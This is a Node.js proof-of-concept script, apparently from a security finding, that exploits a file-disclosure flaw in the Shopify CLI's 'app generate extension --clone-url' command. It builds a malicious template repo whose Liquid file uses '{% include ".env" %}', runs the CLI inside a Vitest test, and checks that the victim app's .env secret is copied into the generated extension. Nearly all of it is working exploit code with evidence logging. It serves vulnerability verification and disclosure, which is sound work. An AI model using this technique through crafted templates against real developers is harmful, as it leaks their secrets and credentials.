#!/usr/bin/env node
import {mkdir, readFile, writeFile, rm} from 'node:fs/promises'
import {existsSync} from 'node:fs'
import {dirname, join, resolve} from 'node:path'
import {fileURLToPath} from 'node:url'
import {spawnSync} from 'node:child_process'

const findingDir = dirname(fileURLToPath(import.meta.url))
const evidenceDir = join(findingDir, 'evidence')
const repoRoot = process.env.REPO_ROOT || resolve(findingDir, '../../..')
const appGenerateDir = join(repoRoot, 'packages/app/src/cli/commands/app/generate')
const appViteConfig = join(repoRoot, 'packages/app/vite.config.ts')
const exploitLog = join(evidenceDir, 'exploit.log')
const impactLog = join(evidenceDir, 'impact.log')
const vitestLog = join(evidenceDir, 'vitest-output.log')
const resultPath = join(evidenceDir, `poc-result-${process.pid}.json`)
const testFile = join(appGenerateDir, `piolium-poc-${process.pid}-${Date.now()}.test.ts`)
const transcript = []

function say(line = '') {
  transcript.push(line)
  console.log(line)
}

async function finish(status, evidence, notes = '') {
  const final = JSON.stringify({status, evidence, notes})
  transcript.push(final)
  await writeFile(exploitLog, `${transcript.join('\n')}\n`)
  console.log(final)
  process.exitCode = status === 'confirmed' ? 0 : 1
}

const testSource = `import AppGenerateExtension from './extension.js'
import {describe, expect, test, vi} from 'vitest'
import {mkdtemp, mkdir, readFile, writeFile} from 'node:fs/promises'
import {execFileSync} from 'node:child_process'
import {tmpdir} from 'node:os'
import {join} from 'node:path'
import {pathToFileURL} from 'node:url'
import {linkedAppContext} from '../../../services/app-context.js'

vi.mock('../../../services/app-context.js', () => ({linkedAppContext: vi.fn()}))
vi.mock('../../../metadata.js', () => ({default: {addPublicMetadata: vi.fn()}}))
vi.mock('@shopify/cli-kit/node/metadata', async (importOriginal) => {
  const actual = await importOriginal<typeof import('@shopify/cli-kit/node/metadata')>()
  return {...actual, addPublicMetadata: vi.fn()}
})
vi.mock('@shopify/cli-kit/node/ui', async (importOriginal) => {
  const actual = await importOriginal<typeof import('@shopify/cli-kit/node/ui')>()
  return {...actual, renderSuccess: vi.fn(), renderWarning: vi.fn()}
})

describe('piolium liquid include file disclosure PoC', () => {
  test('app generate extension --clone-url leaks cwd .env into generated extension', async () => {
    const marker = \`PIOLIUM_SECRET_\${Date.now()}\`
    const work = await mkdtemp(join(tmpdir(), 'shopify-cli-poc-'))
    const appDir = join(work, 'victim-app')
    const tplDir = join(work, 'malicious-template')
    await mkdir(appDir, {recursive: true})
    await mkdir(tplDir, {recursive: true})
    await writeFile(join(appDir, 'shopify.app.toml'), 'name = "victim"\\nclient_id = "test-client-id"\\n')
    await writeFile(join(appDir, '.env'), \`PIOLIUM_SECRET=\${marker}\\n\`)
    await writeFile(join(tplDir, 'leak.txt.liquid'), '{% include ".env" %}\\n')
    execFileSync('git', ['init'], {cwd: tplDir, stdio: 'ignore'})
    execFileSync('git', ['add', '.'], {cwd: tplDir, stdio: 'ignore'})
    execFileSync('git', ['-c', 'user.email=poc@example.invalid', '-c', 'user.name=PoC', 'commit', '-m', 'init'], {cwd: tplDir, stdio: 'ignore'})

    const fakeClient = {
      templateSpecifications: async () => ({
        templates: [
          {
            identifier: 'theme',
            name: 'Theme app extension',
            defaultName: 'leaky-ext',
            group: 'Other',
            supportLinks: [],
            type: 'theme',
            url: 'https://example.invalid/unused',
            extensionPoints: [],
            supportedFlavors: [],
          },
        ],
        groupOrder: [],
      }),
    }
    vi.mocked(linkedAppContext).mockResolvedValue({
      app: {
        directory: appDir,
        allExtensions: [],
        extensionsForType: () => [],
        configuration: {client_id: 'test-client-id'},
      },
      project: {directory: appDir, packageManager: 'pnpm', usesWorkspaces: false},
      specifications: [{identifier: 'theme', externalIdentifier: 'theme', registrationLimit: 1}],
      remoteApp: {apiKey: '[REDACTED:secret]', organizationId: '1', flags: [], developerPlatformClient: fakeClient},
      developerPlatformClient: fakeClient,
      organization: {id: '1', businessName: 'test', source: 'Partners'},
      activeConfig: {},
    } as any)

    const oldCwd = process.cwd()
    process.chdir(appDir)
    try {
      await AppGenerateExtension.run([
        '--path', appDir,
        '--template', 'theme',
        '--name', 'leaky-ext',
        '--clone-url', pathToFileURL(tplDir).href,
      ])
    } finally {
      process.chdir(oldCwd)
    }

    const leakPath = join(appDir, 'extensions', 'leaky-ext', 'leak.txt')
    const leaked = await readFile(leakPath, 'utf8')
    await writeFile(process.env.PIOLIUM_POC_RESULT!, JSON.stringify({work, appDir, tplDir, leakPath, leaked, marker}, null, 2))
    expect(leaked).toContain(marker)
  })
})
`

await mkdir(evidenceDir, {recursive: true})

if (!existsSync(join(repoRoot, 'packages/app/src/cli/commands/app/generate/extension.ts'))) {
  await finish('inconclusive', 'repository layout not found', `REPO_ROOT resolved to ${repoRoot}`)
} else if (!existsSync(appViteConfig)) {
  await finish('inconclusive', 'packages/app vitest config not found', appViteConfig)
} else {
  say('[*] Building malicious local extension-template git repo inside a Vitest-driven CLI invocation')
  say('[*] Invoking AppGenerateExtension.run with --clone-url and the real generate/extension Liquid copy path')
  await writeFile(testFile, testSource)

  try {
    const run = spawnSync(
      'pnpm',
      ['--filter', '@shopify/app', 'exec', 'vitest', 'run', testFile, '--config', appViteConfig, '--pool=forks'],
      {
        cwd: repoRoot,
        encoding: 'utf8',
        env: {...process.env, PIOLIUM_POC_RESULT: resultPath, CI: '1', VITEST_SKIP_TIMEOUT: '1', FORCE_COLOR: '0'},
        maxBuffer: 1024 * 1024 * 20,
      },
    )

    const combined = [
      `command: pnpm --filter @shopify/app exec vitest run ${testFile} --config ${appViteConfig} --pool=forks`,
      `exit_status: ${run.status}`,
      '--- stdout ---',
      run.stdout ?? '',
      '--- stderr ---',
      run.stderr ?? '',
      run.error ? `spawn_error: ${run.error.message}` : '',
    ].join('\n')
    await writeFile(vitestLog, combined)
    say(`[*] Vitest exit status: ${run.status}`)
    say(`[*] Full command output saved to ${vitestLog}`)

    if (run.error) {
      await writeFile(impactLog, `PoC did not execute: ${run.error.message}\n`)
      await finish('inconclusive', 'pnpm/vitest could not be spawned', run.error.message)
    }

    if (!existsSync(resultPath)) {
      await writeFile(impactLog, `PoC result file was not produced. Vitest status: ${run.status}\nSee ${vitestLog}\n`)
      await finish(run.status === 0 ? 'inconclusive' : 'failed', 'no generated leak result file', `see ${vitestLog}`)
    }

    const result = JSON.parse(await readFile(resultPath, 'utf8'))
    const confirmed = typeof result.leaked === 'string' && result.leaked.includes(result.marker)
    const impact = [
      `victim_app: ${result.appDir}`,
      `malicious_template_repo: ${result.tplDir}`,
      `generated_file: ${result.leakPath}`,
      `expected_marker: ${result.marker}`,
      'generated_file_contents:',
      result.leaked,
    ].join('\n')
    await writeFile(impactLog, impact)

    if (run.status === 0 && confirmed) {
      say(`[+] Generated extension file: ${result.leakPath}`)
      say(`[+] Leaked marker observed: ${result.marker}`)
      await finish('confirmed', 'generated extension leak.txt contains PIOLIUM_SECRET marker from victim .env', `impact saved to ${impactLog}`)
    } else {
      await finish('failed', 'generated file did not contain victim .env marker', `see ${impactLog} and ${vitestLog}`)
    }
  } finally {
    await rm(testFile, {force: true})
    await rm(resultPath, {force: true})
  }
}
